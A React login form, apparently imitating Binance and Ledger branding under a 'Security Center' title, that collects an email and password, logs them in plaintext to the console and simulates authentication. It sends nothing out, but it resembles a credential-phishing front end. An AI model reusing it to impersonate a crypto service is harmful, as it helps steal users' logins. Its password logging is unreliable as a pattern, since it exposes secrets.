
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { toast } from "sonner";
import { useAuth } from "@/contexts/AuthContext";

const formSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  password: z.string().min(8, "Password must be at least 8 characters"),
});

type FormData = z.infer<typeof formSchema>;

const BinanceLedgerForm = () => {
  const [isLoading, setIsLoading] = useState(false);
  const { setAuthenticated } = useAuth();
  
  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const onSubmit = async (data: FormData) => {
    console.log('Form submitted with data:', data);
    setIsLoading(true);
    
    try {
      // Simulate authentication process
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Set user as authenticated
      setAuthenticated(data.email);
      
      toast.success("Successfully logged in!");
      
    } catch (error) {
      console.error('Authentication error:', error);
      toast.error("Authentication failed. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-binance-dark flex items-center justify-center p-4">
      <Card className="w-full max-w-md bg-[#1E2329] border-[#2B3139]">
        <CardHeader className="space-y-1">
          <CardTitle className="text-2xl font-bold text-center text-white">
            Security Center
          </CardTitle>
          <CardDescription className="text-center text-[#848E9C]">
            Enter your credentials to access your account
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-[#848E9C]">Email</FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        type="email"
                        placeholder="Enter your email"
                        className="bg-[#2B3139] border-[#474D57] text-white placeholder:text-[#848E9C] focus:border-binance-yellow"
                        disabled={isLoading}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-[#848E9C]">Password</FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        type="password"
                        placeholder="Enter your password"
                        className="bg-[#2B3139] border-[#474D57] text-white placeholder:text-[#848E9C] focus:border-binance-yellow"
                        disabled={isLoading}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-binance-black font-medium"
                disabled={isLoading}
              >
                {isLoading ? "Authenticating..." : "Access Account"}
              </Button>
            </form>
          </Form>
        </CardContent>
      </Card>
    </div>
  );
};

export default BinanceLedgerForm;
